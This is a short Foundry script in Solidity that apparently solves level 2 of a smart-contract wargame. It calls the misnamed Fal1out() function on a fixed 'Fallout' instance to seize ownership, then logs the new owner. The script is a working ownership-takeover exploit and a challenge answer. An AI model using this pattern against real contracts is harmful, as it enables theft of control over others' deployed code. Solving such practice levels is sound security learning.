// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../instance/Level02.sol";

import "forge-std/Script.sol";

contract ExploitLevel02 is Script {
    Fallout instance = Fallout(0x8216C602F2A89ec5C915C21C82Cb8E2359fBF033);

    function run() external {
        vm.broadcast(vm.envUint("PRIVATE_KEY"));
        instance.Fal1out();

        console.log("Instance owner", instance.owner());
        console.log("player:", msg.sender);
    }
}
